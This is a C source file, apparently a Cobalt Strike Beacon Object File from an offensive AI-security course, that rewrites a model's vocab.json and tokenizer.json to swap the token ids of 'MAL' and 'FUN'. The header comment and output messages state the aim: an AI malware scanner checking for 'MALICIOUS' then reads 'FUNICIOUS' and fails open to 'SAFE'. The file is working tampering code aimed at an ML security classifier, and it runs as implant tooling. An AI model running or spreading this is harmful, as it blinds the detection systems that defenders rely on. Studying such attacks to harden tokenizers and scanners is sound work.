/*
 * tokenizerSwap.c — MAL<->FUN token-id swap in BOTH json files (OSAI T3).
 * Course: M8.2.3 — "MALICIOUS" = MAL+IC+IOUS; swap MAL<->FUN ids in vocab.json
 *         AND tokenizer.json so the scanner string-check ("MALICIOUS") misses ->
 *         fail-open SAFE.  Editing only vocab.json has NO effect (fast tokenizer
 *         loads tokenizer.json).  ATLAS AML.T0010.003.
 *
 * args: str vocabPath, str tokPath, int dryRun(1=preview only)
 */
#include "aibof.h"

/* find first "KEY" occurrence; then the number span after ':'.
 * returns 1 and sets *nstart/*nlen (offsets into buf) on success. */
static int find_num(const char* buf, int len, const char* key,
                    int* nstart, int* nlen, int* val) {
  char pat[32]; pat[0] = '"';
  int kl = (int)xlen(key);
  xmemcpy(pat + 1, key, kl); pat[1 + kl] = '"'; pat[2 + kl] = 0;
  int pl = 2 + kl;
  for (int i = 0; i + pl <= len; i++) {
    if (xmemcmp(buf + i, pat, pl) != 0) continue;
    int j = i + pl;
    while (j < len && (buf[j] == ' ' || buf[j] == '\t' || buf[j] == ':' || buf[j] == '\n' || buf[j] == '\r')) j++;
    if (j >= len || buf[j] < '0' || buf[j] > '9') continue;
    int s = j, v = 0;
    while (j < len && buf[j] >= '0' && buf[j] <= '9') { v = v * 10 + (buf[j] - '0'); j++; }
    *nstart = s; *nlen = j - s; *val = v;
    return 1;
  }
  return 0;
}

/* swap two numeric spans (a.pos < b.pos): build out buffer */
static int do_swap(const char* buf, int len, int as, int al, int bs, int bl,
                   char* out, int max) {
  int o = 0;
  if (as + al > bs) return -1; /* a must precede b */
  /* 0..as */
  xmemcpy(out + o, buf, as); o += as;
  /* b's digits */
  xmemcpy(out + o, buf + bs, bl); o += bl;
  /* as+al .. bs */
  int mid = bs - (as + al);
  xmemcpy(out + o, buf + as + al, mid); o += mid;
  /* a's digits */
  xmemcpy(out + o, buf + as, al); o += al;
  /* rest */
  int rest = len - (bs + bl);
  xmemcpy(out + o, buf + bs + bl, rest); o += rest;
  return o;
}

static int process_file(const char* path, int dryRun) {
  unsigned char* buf = NULL; DWORD got = 0;
  if (!read_file(path, &buf, &got, 8 * 1024 * 1024)) {
    BeaconPrintf(CALLBACK_ERROR, "[-] %s unreadable\n", path); return 0;
  }
  int as, al, av, bs, bl, bv;
  if (!find_num((char*)buf, got, "MAL", &as, &al, &av) ||
      !find_num((char*)buf, got, "FUN", &bs, &bl, &bv)) {
    BeaconPrintf(CALLBACK_ERROR, "[-] %s: MAL or FUN not found\n", path);
    intFree(buf); return 0;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[*] %s: MAL=%d FUN=%d\n", path, av, bv);
  /* ensure a precedes b for do_swap; if not, swap roles */
  int rlen;
  char* out = (char*)intAlloc(got + 16);
  if (as < bs)
    rlen = do_swap((char*)buf, got, as, al, bs, bl, out, got + 16);
  else
    rlen = do_swap((char*)buf, got, bs, bl, as, al, out, got + 16);
  if (rlen < 0) { BeaconPrintf(CALLBACK_ERROR, "[-] %s span order\n", path); intFree(out); intFree(buf); return 0; }

  if (dryRun) {
    BeaconPrintf(CALLBACK_OUTPUT, "[dry-run] %s would become: MAL=%d FUN=%d (not written)\n", path, bv, av);
    intFree(out); intFree(buf); return 1;
  }
  HANDLE h = KERNEL32$CreateFileA(path, GENERIC_WRITE, 0, NULL,
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (h == INVALID_HANDLE_VALUE) {
    BeaconPrintf(CALLBACK_ERROR, "[-] write %s %lu\n", path, KERNEL32$GetLastError());
    intFree(out); intFree(buf); return 0;
  }
  DWORD wrote = 0; KERNEL32$WriteFile(h, out, rlen, &wrote, NULL); KERNEL32$CloseHandle(h);
  BeaconPrintf(CALLBACK_OUTPUT, "[+] %s swapped+written (%lu bytes). MALICIOUS now decodes FUNICIOUS.\n", path, wrote);
  intFree(out); intFree(buf);
  return 1;
}

void go(char* args, int alen) {
  datap p; BeaconDataParse(&p, args, alen);
  char* vocab = BeaconDataExtract(&p, NULL);
  char* tok = BeaconDataExtract(&p, NULL);
  int dry = BeaconDataInt(&p);
  if (!vocab || !*vocab || !tok || !*tok) {
    BeaconPrintf(CALLBACK_ERROR, "usage: tokenizerSwap <vocab.json> <tokenizer.json> [dryRun]\n");
    return;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[*] tokenizerSwap dry=%d (BOTH files required for effect)\n", dry);
  int v = process_file(vocab, dry);
  int t = process_file(tok, dry);
  if (!dry && (!v || !t))
    BeaconPrintf(CALLBACK_OUTPUT, "[!] PARTIAL swap — scanner will NOT fail-open unless BOTH succeed (M8.2.3).\n");
  BeaconPrintf(CALLBACK_OUTPUT, "[*] tokenizerSwap done\n");
}